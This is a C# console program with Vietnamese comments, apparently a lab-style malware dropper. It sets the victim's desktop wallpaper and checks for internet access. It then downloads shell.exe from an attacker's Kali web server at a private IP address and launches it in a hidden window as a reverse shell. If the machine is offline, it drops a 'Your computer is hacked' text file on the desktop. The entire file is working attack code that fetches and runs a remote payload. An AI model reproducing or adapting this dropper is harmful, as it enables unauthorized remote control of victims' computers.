using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.ServiceProcess;
using System.Net.Sockets;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Web;
using System.ComponentModel;
using System.Windows.Forms;

namespace ConsoleApp1
{
    class Program
    {

        static void Main(string[] args)
        {
            //lấy đường dẫn file ảnh, ảnh nằm cùng đường dẫn với file thực thi(.exe) của project hiện hành
            string photo = System.IO.Directory.GetCurrentDirectory()+@"\1.jpg";
            DisplayPicture(photo);//thay ảnh nền
            check_HTTP_Status();//kiểm tra kết nối internet
            Console.ReadKey();
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x1;
        private const uint SPIF_SENDWININICHANGE = 0x2;
        //Hàm đổi ảnh nền máy tính nạn nhân
        private static void DisplayPicture(string file_name)
        {
            uint flags = 0;
            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, file_name, flags))
            {
                Console.WriteLine("Error");
            }
        }
        //Hàm kiểm tra kết nối internet, nếu có tải payload từ kali và chạy reverse shell
        //nếu không tạo file test.txt ở desktop của nạn nhân.
        private static void check_HTTP_Status()
        {
            //gửi 1 yêu cầu HttpWebRequest đến URL của google, chờ nhận HTTP status code.
            HttpWebRequest req = WebRequest.Create(
            "https://www.google.com.vn/") as HttpWebRequest;
            HttpWebResponse rsp;
            try
            {
                rsp = req.GetResponse() as HttpWebResponse;//nếu kết nối thành công, http status code=200.
            }
            catch (WebException e)//xử lí các ngoại lệ
            {
                if (e.Response is HttpWebResponse)
                {
                    rsp = e.Response as HttpWebResponse;//các status code khác như: 301,404,502,... nhưng máy tính vẫn có internet.
                }
                else
                {
                    rsp = null;//máy tính không nhận được code do không có internet. In cảnh báo.
                    Console.WriteLine("Something is wrong with network. Please check the internet connection!");
                    CreateText();
                }
            }
            if (rsp != null)//máy tính có kết nối internet, In mã code, download file payload ở máy kali và gọi thực thi hàm tạo reverse shell đơn giản.
            {
                Console.WriteLine("Server responses HTTP_" + (int)rsp.StatusCode + "_" + rsp.StatusCode.ToString());
                download_P();
                reverse_shell();
            }
        }
        //Tạo 1 file text có tên test.txt ở desktop của nạn nhân với nội dung như bên dưới
        //kiểm tra nếu chưa có file tạo file mới, nếu có xóa file cũ tạo file mới.
        private static void CreateText()
        {
            //Sử dụng Environment.SpecialFolder để lấy đường dẫn tới desktop.
            string strPath = Environment.GetFolderPath(System.Environment.SpecialFolder.DesktopDirectory);
            string fileName = strPath+@"\test.txt";
            try
            {
                // kiểm tra nếu đã có file thì xóa     
                if (File.Exists(fileName))
                {
                    File.Delete(fileName);
                }

                // tạo file mới     
                using (FileStream fs = File.Create(fileName))
                {
                    // Thêm nội dung vào file   
                    Byte[] title = new UTF8Encoding(true).GetBytes("Hello, I am Kali\n");
                    fs.Write(title, 0, title.Length);
                    byte[] author = new UTF8Encoding(true).GetBytes("Your computer is hacked, turn on the internet now!");
                    fs.Write(author, 0, author.Length);
                }
            }
            catch (Exception Ex)//bắt các ngoại lệ.
            {
                Console.WriteLine(Ex.ToString());
            }

        }
       //hàm thực thi reverse shell được tải về, file ở đường dẫn file thực thi của project hiện hành.
        private static void reverse_shell()
        {
            string path = System.IO.Directory.GetCurrentDirectory() + @"\shell.exe";
            ProcessStartInfo si = new ProcessStartInfo(path);
            Process p = new Process();
            p.StartInfo = si;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();
            //p.WaitForExit();
        }
        //hàm tải payload được tạo sẵn ở kali, file được lưu với tên shell.exe, nằm cùng đường dẫn với file thực thi của project
        private static void download_P()
        {

            string path = System.IO.Directory.GetCurrentDirectory() + @"\shell.exe";
            if (File.Exists(path))//kiểm tra nếu có file đã tồn tại, xóa đi tải file mới.
            {
                File.Delete(path);
            }
            WebClient webClient = new WebClient();
            //ip của attacker là 192.168.43.210, đã bật apache2 webserver.
            webClient.DownloadFile("http://192.168.43.210/shell.exe",path);
        }
    }
}

  
